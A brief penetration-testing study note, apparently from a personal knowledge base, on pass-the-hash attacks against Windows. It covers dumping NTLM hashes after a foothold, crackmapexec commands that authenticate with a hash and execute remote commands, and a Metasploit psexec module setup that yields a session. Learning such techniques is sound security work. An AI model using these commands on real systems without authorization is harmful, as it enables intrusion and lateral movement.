
It's an exploitation technique that involves capturing or harvesting NTLM or clear-text hashes and utilizing them to auth with the target legitimately.

This is related mostly to [[Metasploit]] and [[Post Exploitation]]

Once we have a foothold we can use hashdump to get the NTL/NT Hash which is needed along with the password hash

When we have both we can use psexec exploit (see options, we set SMBPass as the password hash and then separated with : the NTL/NT hash)

We can also use crackmapexec

``` bash
crackmapexec smb [IP] -u [username] -H "[NTLM Hash]"
```

We can then run commands with

``` bash
crackmapexec smb [IP] -u [username] -H "[NTLM Hash]" -X "[commandToRun]"
```


(We can also use PsExec, to see how to get hashes checkout [[Dumping Hashes with Mimikatz]])

To use PsExec with msfconsole:

``` bash
use exploit/windows/smb/psexec
set LPORT [lPORT]
set RHOSTS [rIP]
set SMBUser [user]
set SMBPass [hash]
set target Native\ upload
```

Then run with exploit to obtain a session